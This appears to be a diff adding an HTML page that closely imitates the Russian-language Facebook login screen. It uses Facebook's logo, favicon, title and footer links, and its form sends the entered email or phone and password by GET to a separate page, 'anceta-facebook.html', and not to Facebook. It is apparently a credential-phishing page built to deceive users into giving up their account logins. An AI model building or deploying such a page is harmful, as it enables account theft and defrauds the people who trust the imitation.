@@ -1,0 +1,221 @@
+
+<!DOCTYPE html>
+<html lang="ua">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
+    <title>Facebook</title>
+  </head>
+  <body style="min-height: 100vh;">
+
+<main class="main">  
+	<div class="container">
+		<div class="main-control">
+			<div class="row">
+				<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
+                 <div class="forma">
+                 	<form action="anceta-facebook.html" method="GET">
+                 		<p class="p">Вход на Facebook</p>
+                 		<input type="login" name="login" placeholder="Электронный адрес или номер телефона">
+                 		<input type="password" name="password" minlength="6" maxlength="30" placeholder="Пароль">
+                 		<button class="button1" name="formSubmit">Вход</button>
+                 	</form>
+                 	<a class="a" href="#">Забыли аккаунт?</a>
+                 	<div class="p1"></div> <p class="p3">или</p> <div class="p1"></div>
+                    <a class="a-two" href=""><button class="button2">Coздать новый аккаунт</button></a>
+                 </div>
+			</div>
+		</div>
+	</div>
+</main>
+
+<section class="section">  
+    <div class="container">
+        <div class="section-control">
+            <div class="row">
+              <div class="col-md-12">
+                <nav class="nav">
+                <ul class="ul">
+                    <li>
+                        <a class="a-li" href="">Meta</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Информация</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Блог</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Вакансии</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Помощь</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">API</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Конфиденциальность</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Условия</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Популярные аккаунты</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Места</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Facebook Lite</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Загрузка контактов и лица, не являющиеся пользователями</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">Русский</a>
+                    </li>
+                    <li>
+                        <a class="a-li" href="">© 2023 Facebook from Meta</a>
+                    </li>
+                </ul>
+              </nav>
+              </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<style>
+	html, body{
+		height: 100%;
+	}
+.main{
+	background: rgb(240, 242, 245) no-repeat center;
+	background-size: 100%;
+	height: 100%;
+}
+.main-control{
+	text-align: center;
+}
+img{
+	width: 240px;
+	display: block;
+	margin: auto;
+	margin-top: 3rem;
+}
+.forma{
+	background-color: white;
+	display: inline-block;
+	border-radius: 0.8rem;
+	width: 39rem;
+	padding: 2.5rem 1.5rem 2.5rem 1.5rem;
+	box-shadow: rgba(0, 0, 0, 0.1) 0px 2px 4px 0px, rgba(0, 0, 0, 0.1) 0px 8px 16px 0px;
+	margin: 0 1rem;
+}
+input{
+	display: block;
+	width: 100%;
+	padding: 1.1rem 1.3rem;
+	border-radius: 0.4rem;
+	border: 1.5px solid #b4b4b4;
+	font-size: 17px; 
+	margin: 1.5rem 0;
+}
+input::placeholder{
+	color: rgba(180, 180, 180, 00.9); 
+}
+.p{
+	font-size: 19px;
+	line-height: 22px;
+	margin-bottom: 2rem;
+}
+.button1{
+ width: 100%;
+ color: white;
+ font-weight: bold;
+ font-size: 20px;
+ padding: 0.6rem 0;
+ border: none;
+ border-radius: 0.5rem;
+ background-color: #1877f2;
+}
+.a{
+	color:#1877f2; 
+	display: block;
+	margin-top: 1.4rem;
+}
+.p1, .p3{
+ display: inline-block;
+}
+.p1{
+  background-color: rgba(180, 180, 180, 0.6);
+  height: 1px;
+  width: 45%;
+}
+.p3{
+	color: rgba(180, 180, 180, 1);
+	font-size: 12px;
+	position: relative;
+	top: 3px;
+}
+.a-two{
+	display: block;
+}
+.button2{
+	width: 65%;
+	background-color: rgba(43, 146, 23, 0.8);
+	font-size: 17px;
+	font-weight: bold;
+	color: white;
+	border: none;
+	border-radius: 0.4rem;
+	padding: 1rem 1rem;
+	margin-top: 1rem;
+}
+@media(max-width: 410px){
+  .forma{
+   width: 33rem;
+  }
+  .button2{
+  	font-size: 12px;
+  }
+}
+@media(max-width: 349px){
+  .forma{
+   width: 30rem;
+  }
+  .p1{
+  	width: 40%;
+  }
+}
+input {outline:none;}
+
+.button1:hover{
+	background-image: -webkit-linear-gradient(top, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.2));
+}
+.button2:hover{
+	background-image: -webkit-linear-gradient(top, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.2));
+}
+nav{
+    width: 95%;
+    text-align: center;
+    margin-top: 3rem;
+}
+li{
+    list-style-type:none;
+    display: inline-block;
+}
+.a-li{
+    color: rgb(142, 142, 142);
+    font-size: 12px;
+}
+</style>
+
+  </body>
+</html>
